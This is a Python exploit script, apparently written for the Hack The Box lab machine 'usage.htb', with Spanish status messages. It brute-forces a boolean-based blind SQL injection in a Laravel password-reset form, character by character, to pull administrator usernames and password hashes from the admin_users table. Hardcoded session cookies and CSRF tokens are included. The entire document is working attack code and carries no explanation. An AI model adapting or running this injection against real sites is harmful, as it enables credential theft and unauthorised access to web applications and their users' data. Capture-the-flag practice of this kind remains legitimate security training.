#!/usr/bin/env python3

import requests
import signal
import time
import pdb
import sys
import string

from pwn import *
from termcolor import colored


def def_handler(sig, frame):
	print(colored(f"\n\n[!] Saliendo...\n", 'red'))
	sys.exit(1)


# Ctrl-C
signal.signal(signal.SIGINT, def_handler)

cookies = {
	'laravel_session': 'eyJpdiI6InhRanlqK2tnbTlkYkhmZERFTGRoaGc9PSIsInZhbHVlIjoicHEyU3I4T3R0VWFBdHF4WHMvbkJHWlRlUk1zOC9GaFpRZ1duQ3VnOGtFTElsNXIvT00vVzI2YkxSR25LZlFSQ2RucmE5bEM3bXVrd0Y3RWxRRXIweE5EeEpQTFB1R2hUTU8zYVJHdFZCa0hzQkE4bUVNeW1mWkIvMm4rSmNOU3EiLCJtYWMiOiJhNWY1MTRlZGUzOTQwNjZiNGE0MTVlYTJjZWViNTQyMjY3NmRlMzc2MTM1NDcyOWJkYzBlM2EwNmQwMTIzZmYyIiwidGFnIjoiIn0=', 
	'XSRF-TOKEN': 'eyJpdiI6IndQVXpmQVo1S3VNYnYvd0tTYkVOVVE9PSIsInZhbHVlIjoiclFUaXU1R3ZJaWpwSkZWanJCbTVtd0RJY2oyZ1NydmJIK2Nnb3RONjRxRVZUMlJKOExVZDQwTUpTSE82bEFQZmtXajEvTDlBclNKeXk0Sk1TM3BsQWd4OStkWFBqelR4WHZ6MlVFVktmcGs2bFRJVGF3ZS9vd0E5Q2dmeGg4eGsiLCJtYWMiOiJkZThmNjRhN2EzYmUwYjlkNzM4ZWRlMjdjOTM2NmE0MjM5ZjFmNTljZGQzZDM5MGVhZTgwMDhmOGY4Y2Y4NjBiIiwidGFnIjoiIn0='
}

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '-_,$./\@:~&*?!'
main_url = "http://usage.htb/forget-password"

def makeSQLI():

	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando Brute Force")
	time.sleep(2)

	database = ""
	p2 = log.progress("DataBase")
	for i in range(1, 1000):
		for character in characters:
			post_data = {
				'_token': 'adNunLtYIfujSfiAhyDK3RFj2Owi6LLfSewWPWgM',
				'email': f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),{i},1)='{character}'-- -"
# database_name = usage_blog
			}

			p1.status(post_data['email'])
			r = requests.post(main_url, data=post_data, cookies=cookies)

			if "We have e-mailed your password reset" in r.text:
				#print(f"Database start ==>> {character}")
				database += character
				p2.status(database)
				break

if __name__ == '__main__':

	makeSQLI()
